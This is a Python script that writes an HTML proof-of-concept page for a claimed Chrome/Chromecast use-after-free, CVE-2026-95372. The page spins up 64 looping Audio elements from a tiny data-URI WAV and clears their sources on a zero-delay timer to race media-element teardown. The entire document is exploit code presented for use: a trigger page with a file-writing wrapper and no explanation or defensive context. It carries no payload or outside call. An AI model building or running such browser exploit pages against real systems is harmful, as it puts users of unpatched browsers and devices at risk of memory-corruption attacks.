#!/usr/bin/env python3
"""CVE-2026-95372 — Chrome/Chromecast UaF (fixed 154.0.8037.57). HTML page
using a media-element teardown race to free a receiver object mid-callback."""
import sys
from pathlib import Path

HTML = b"""<!doctype html><html><body>
<video id=v muted></video>
<script>
var v=document.getElementById('v');
// small valid silent media so the pipeline spins up
var src='data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=';
for(var i=0;i<64;i++){
  (function(){
    var a=new Audio(src);
    a.onended=function(){ a.load(); a.play().catch(function(){}); };
    a.play().catch(function(){});
    setTimeout(function(){ a.src=''; },0);
  })();
}
</script></body></html>"""

def build() -> bytes: return HTML

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2026-95372.html")
    out.write_bytes(build()); print(f"[+] CVE-2026-95372 HTML -> {out}")

if __name__ == "__main__":
    main()
